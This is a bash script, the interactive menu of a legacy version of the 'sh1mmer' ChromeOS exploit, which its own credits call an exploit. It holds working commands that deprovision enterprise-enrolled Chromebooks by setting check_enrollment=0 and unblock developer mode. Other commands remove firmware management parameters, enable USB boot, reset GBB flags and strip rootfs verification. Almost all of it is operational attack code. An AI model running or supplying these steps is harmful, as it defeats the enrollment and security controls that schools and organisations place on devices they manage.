#!/bin/bash

deprovision() {
	echo "Deprovisioning..."
	vpd -i RW_VPD -s check_enrollment=0
	unblock_devmode
}

reprovision() {
	echo "Reprovisioning..."
	vpd -i RW_VPD -s check_enrollment=1
	echo "Done"
}

unblock_devmode() {
	echo "Unblocking devmode..."
	vpd -i RW_VPD -s block_devmode=0
	crossystem block_devmode=0
	local res
	res=$(cryptohome --action=get_firmware_management_parameters 2>&1)
	if [ $? -eq 0 ] && ! echo "$res" | grep -q "Unknown action"; then
		tpm_manager_client take_ownership
		cryptohome --action=remove_firmware_management_parameters
	fi
	echo "Done"
}

enable_usb_boot() {
	echo "Enabling USB/altfw boot"
	crossystem dev_boot_usb=1
	crossystem dev_boot_legacy=1
	crossystem dev_boot_altfw=1
	echo "Done"
}

reset_gbb_flags() {
	echo "Resetting GBB flags... This will only work if WP is disabled"
	/usr/share/vboot/bin/set_gbb_flags.sh 0x0
	echo "Done"
}

get_largest_blockdev() {
	local largest size dev_name tmp_size remo
	size=0
	for blockdev in /sys/block/*; do
		dev_name="${blockdev##*/}"
		echo "$dev_name" | grep -q '^\(loop\|ram\)' && continue
		tmp_size=$(cat "$blockdev"/size)
		remo=$(cat "$blockdev"/removable)
		if [ "$tmp_size" -gt "$size" ] && [ "${remo:-0}" -eq 0 ]; then
			largest="/dev/$dev_name"
			size="$tmp_size"
		fi
	done
	echo "$largest"
}

get_largest_cros_blockdev() {
	local largest size dev_name tmp_size remo
	size=0
	for blockdev in /sys/block/*; do
		dev_name="${blockdev##*/}"
		echo "$dev_name" | grep -q '^\(loop\|ram\)' && continue
		tmp_size=$(cat "$blockdev"/size)
		remo=$(cat "$blockdev"/removable)
		if [ "$tmp_size" -gt "$size" ] && [ "${remo:-0}" -eq 0 ]; then
			case "$(sfdisk -l -o name "/dev/$dev_name" 2>/dev/null)" in
				*STATE*KERN-A*ROOT-A*KERN-B*ROOT-B*)
					largest="/dev/$dev_name"
					size="$tmp_size"
					;;
			esac
		fi
	done
	echo "$largest"
}

disable_verity() {
	local cros_dev="$(get_largest_cros_blockdev)"
	if [ -z "$cros_dev" ]; then
		echo "No CrOS SSD found on device!"
		return
	fi
	echo "READ THIS!!!!!! DON'T BE STUPID"
	echo "This script will disable rootfs verification. What does this mean? You'll be able to edit any file on the chromebook, useful for development, messing around, etc"
	echo "IF YOU DO THIS AND GO BACK INTO VERIFIED MODE (press the space key when it asks you to on the boot screen) YOUR CHROMEBOOK WILL STOP WORKING AND YOU WILL HAVE TO RECOVER"
	sleep 4
	read -p "Do you still want to do this? (y/N) " confirm
	case "$confirm" in
		[yY]) /usr/share/vboot/bin/make_dev_ssd.sh -i "$cros_dev" --remove_rootfs_verification ;;
		*) return ;;
	esac
}

factory() {
	clear
	bash /usr/sbin/factory_install_backup.sh
}

tetris() {
	clear
	vitetris
}

splash() {
	printf "\033[1;92m"
	echo "ICBfX18gXyAgXyBfIF9fICBfXyBfXyAgX18gX19fIF9fXyAKIC8gX198IHx8IC8gfCAgXC8gIHwgIFwvICB8IF9ffCBfIFwKIFxfXyBcIF9fIHwgfCB8XC98IHwgfFwvfCB8IF98fCAgIC8KIHxfX18vX3x8X3xffF98ICB8X3xffCAgfF98X19ffF98X1wKCg==" | base64 -d
	printf "\033[0m"
}

credits() {
	echo "CREDITS:"
	echo "CoolElectronics#4683 - Pioneering this wild exploit"
	echo "ULTRA BLUE#1850 - Testing & discovering how to disable rootfs verification"
	echo "Unciaur#1408 - Found the inital RMA shim"
	echo "TheMemeSniper#6065 - Testing"
	echo "Rafflesia#8396 - Hosting files"
	echo "Bypassi#7037 - Helped with the website"
	echo "r58Playz#3467 - Helped us set parts of the shim & made the initial GUI script"
	echo "OlyB#9420 - Scraped additional shims + this legacy script"
	echo "Sharp_Jack#4374 - Created wax & compiled the first shims"
	echo "ember#0377 - Helped with the website"
	echo "Mark - Technical Understanding and Advisory into the ChromeOS ecosystem"
}

setterm -cursor on
clear
splash
echo "This is a legacy version of sh1mmer."

while true; do
	echo "Select an option:"
	echo "(b) Bash shell"
	echo "(d) Deprovision device"
	echo "(r) Reprovision device"
	echo "(m) Unblock devmode"
	echo "(u) Enable USB/altfw boot"
	echo "(g) Reset GBB flags (in case of an accidental bootloop) WP MUST BE DISABLED"
	echo "(v) Remove rootfs verification"
	echo "(t) Call chromeos-tpm-recovery"
	echo "(f) Continue to factory installer"
	echo "(i) Tetris"
	echo "(c) Credits"
	echo "(e) Exit and reboot"
	read -p "> " choice
	case "$choice" in
	b | B) bash ;;
	d | D) deprovision ;;
	r | R) reprovision ;;
	m | M) unblock_devmode ;;
	u | U) enable_usb_boot ;;
	g | G) reset_gbb_flags ;;
	v | V) disable_verity ;;
	t | T) chromeos-tpm-recovery ;;
	f | F) factory ;;
	i | I) tetris ;;
	c | C) credits ;;
	e | E) break ;;
	*) echo "Invalid option" ;;
	esac
	echo ""
done

setterm -cursor off
clear
splash
credits
sleep 6
echo ""
echo "Rebooting..."
reboot
sleep infinity
